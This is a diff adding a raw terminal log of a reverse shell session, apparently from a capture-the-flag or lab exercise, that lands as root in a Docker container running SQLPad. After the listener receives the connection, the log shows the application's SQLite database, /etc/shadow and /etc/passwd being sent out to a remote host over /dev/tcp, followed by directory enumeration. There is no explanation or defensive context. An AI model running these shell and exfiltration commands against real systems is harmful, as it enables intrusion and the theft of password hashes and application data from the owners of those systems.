@@ -1,0 +1,73 @@
+Listening on 0.0.0.0 4444
+Connection received on 10.10.11.32 43640
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@c184118df0a6:/var/lib/sqlpad# ls -lash
+total 200K
+4.0K drwxr-xr-x 4 root root 4.0K Jan 17 17:22 .
+4.0K drwxr-xr-x 1 root root 4.0K Mar 12  2022 ..
+4.0K drwxr-xr-x 2 root root 4.0K Aug  9 11:17 cache
+4.0K drwxr-xr-x 2 root root 4.0K Aug  9 11:17 sessions
+184K -rw-r--r-- 1 root root 184K Jan 17 17:22 sqlpad.sqlite
+root@c184118df0a6:/var/lib/sqlpad# <pad# cat sqlpad.sqlite > /dev/tcp/10.10.14.191/5555
+root@c184118df0a6:/var/lib/sqlpad# <pad# cat sqlpad.sqlite > /dev/tcp/10.10.14.191/5555
+root@c184118df0a6:/var/lib/sqlpad# <qlpad# cat /etc/shadow > /dev/tcp/10.10.14.191/5555
+root@c184118df0a6:/var/lib/sqlpad# <qlpad# cat /etc/passwd > /dev/tcp/10.10.14.191/5555
+root@c184118df0a6:/var/lib/sqlpad# ls -lash
+total 200K
+4.0K drwxr-xr-x 4 root root 4.0K Jan 17 17:22 .
+4.0K drwxr-xr-x 1 root root 4.0K Mar 12  2022 ..
+4.0K drwxr-xr-x 2 root root 4.0K Aug  9 11:17 cache
+4.0K drwxr-xr-x 2 root root 4.0K Aug  9 11:17 sessions
+184K -rw-r--r-- 1 root root 184K Jan 17 17:50 sqlpad.sqlite
+root@c184118df0a6:/var/lib/sqlpad# ls -lash /
+total 88K
+4.0K drwxr-xr-x   1 root root 4.0K Aug  2 09:30 .
+4.0K drwxr-xr-x   1 root root 4.0K Aug  2 09:30 ..
+   0 -rwxr-xr-x   1 root root    0 Aug  2 09:30 .dockerenv
+4.0K drwxr-xr-x   2 root root 4.0K Feb 28  2022 bin
+4.0K drwxr-xr-x   2 root root 4.0K Oct  3  2021 boot
+   0 drwxr-xr-x   5 root root  340 Jan 17 17:22 dev
+4.0K -rwxr-xr-x   1 root root  413 Mar 12  2022 docker-entrypoint
+8.0K drwxr-xr-x   1 root root 4.0K Aug  6 11:23 etc
+8.0K drwxr-xr-x   1 root root 4.0K Aug  6 11:23 home
+4.0K drwxr-xr-x   1 root root 4.0K Mar  2  2022 lib
+4.0K drwxr-xr-x   2 root root 4.0K Feb 28  2022 lib64
+4.0K drwxr-xr-x   2 root root 4.0K Feb 28  2022 media
+4.0K drwxr-xr-x   2 root root 4.0K Feb 28  2022 mnt
+4.0K drwxr-xr-x   1 root root 4.0K Mar  2  2022 opt
+   0 dr-xr-xr-x 313 root root    0 Jan 17 17:22 proc
+4.0K drwx------   1 root root 4.0K Aug  9 09:42 root
+4.0K drwxr-xr-x   3 root root 4.0K Feb 28  2022 run
+4.0K drwxr-xr-x   2 root root 4.0K Feb 28  2022 sbin
+4.0K drwxr-xr-x   2 root root 4.0K Feb 28  2022 srv
+   0 dr-xr-xr-x  13 root root    0 Jan 17 17:22 sys
+4.0K drwxrwxrwt   1 root root 4.0K Mar  2  2022 tmp
+4.0K drwxr-xr-x   1 root root 4.0K Mar 12  2022 usr
+8.0K drwxr-xr-x   1 root root 4.0K Feb 28  2022 var
+root@c184118df0a6:/var/lib/sqlpad# cd /usr
+root@c184118df0a6:/usr# ls -lsh
+total 36K
+4.0K drwxr-xr-x 1 root root 4.0K Mar 12  2022 app
+4.0K drwxr-xr-x 1 root root 4.0K Mar 12  2022 bin
+4.0K drwxr-xr-x 2 root root 4.0K Oct  3  2021 games
+4.0K drwxr-xr-x 2 root root 4.0K Oct  3  2021 include
+4.0K drwxr-xr-x 1 root root 4.0K Mar 12  2022 lib
+4.0K drwxr-xr-x 1 root root 4.0K Mar  2  2022 local
+4.0K drwxr-xr-x 1 root root 4.0K Mar 12  2022 sbin
+4.0K drwxr-xr-x 1 root root 4.0K Mar 12  2022 share
+4.0K drwxr-xr-x 2 root root 4.0K Oct  3  2021 src
+root@c184118df0a6:/usr# ls /root
+root@c184118df0a6:/usr# ls -lash /root
+total 28K
+4.0K drwx------ 1 root root 4.0K Aug  9 09:42 .
+4.0K drwxr-xr-x 1 root root 4.0K Aug  2 09:30 ..
+   0 lrwxrwxrwx 1 root root    9 Aug  9 09:42 .bash_history -> /dev/null
+4.0K -rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
+4.0K drwxr-xr-x 3 root root 4.0K Aug  2 09:30 .cache
+4.0K drwx------ 1 root root 4.0K Mar  2  2022 .gnupg
+4.0K drwxr-xr-x 3 root root 4.0K Mar  2  2022 .npm
+4.0K -rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+root@c184118df0a6:/usr# ss -tuln
+bash: ss: command not found
+root@c184118df0a6:/usr# 
